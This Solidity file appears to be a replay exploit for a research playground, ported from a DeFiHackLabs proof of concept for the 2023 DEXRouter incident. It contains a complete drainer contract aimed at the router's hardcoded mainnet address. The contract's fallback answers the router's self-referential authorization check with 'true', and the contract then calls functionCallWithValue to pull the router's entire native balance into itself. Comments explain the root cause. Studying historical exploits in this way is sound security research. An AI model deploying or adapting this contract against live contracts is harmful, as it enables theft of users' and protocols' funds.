// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-09-DEXRouter).
// The original DeFiHackLabs PoC runs the attack INLINE in the Foundry test
// contract (ContractTest is simultaneously the "attacker", the target of
// DEXRouter's self-defeating authorization callback, and the payable
// receiver of the drained BNB) — there is no standalone exploit contract to
// deploy, and the only cheatcodes used (deal(...,0), vm.label, vm.createSelectFork,
// emit log_named_decimal_uint) are cosmetic / handled by common fork-loading
// infra. This is a faithful, self-contained copy of the inline attack
// (testExploit + a() + fallback) with zero cheatcodes, so the playground can
// deploy it and record run(). Logic and constants copied verbatim from
// test/DEXRouter_exp.sol.
//
// Root cause: DEXRouter.functionCallWithValue(target, data, value) makes an
// arbitrary, caller-controlled external call that forwards the ROUTER'S OWN
// native balance, with no access control. update(...) "authorizes" writing
// new config addresses by staticcall-ing a fixed selector on the very address
// being registered — so the attacker's own fallback answers its own
// authorization check with "true".

interface IDEXRouter {
    function update(address fcb, address bnb, address busd, address router) external;

    function functionCallWithValue(address target, bytes memory data, uint256 value) external;
}

contract DEXRouterDrain {
    // Victim contract is unverified on BscScan; address taken from the live incident.
    address constant DEX_ROUTER = 0x1f7cF218B46e613D1BA54CaC11dC1b5368d94fb7;

    // step 0: register this contract in all four config slots. Before writing,
    // DEXRouter staticcalls selector 0xe44a73b7 on the address being written in
    // (this contract) to "confirm" it — see fallback() below.
    function run() external {
        IDEXRouter(DEX_ROUTER).update(address(this), address(this), address(this), address(this));

        // step 1: the actual theft. functionCallWithValue forwards the
        // ROUTER'S OWN balance into a call whose target/data/value this
        // contract fully controls.
        IDEXRouter(DEX_ROUTER).functionCallWithValue(
            address(this),
            abi.encodePacked(this.a.selector),
            DEX_ROUTER.balance
        );
    }

    // The payable call target functionCallWithValue forwards the drained BNB into.
    function a() external payable returns (bool) {
        return true;
    }

    // Answers DEXRouter's self-referential "are you authorized?" callback with
    // whatever this contract wants — here, always "true".
    fallback(bytes calldata data) external payable returns (bytes memory) {
        if (bytes4(data) == bytes4(0xe44a73b7)) {
            return abi.encode(true);
        }
    }
}
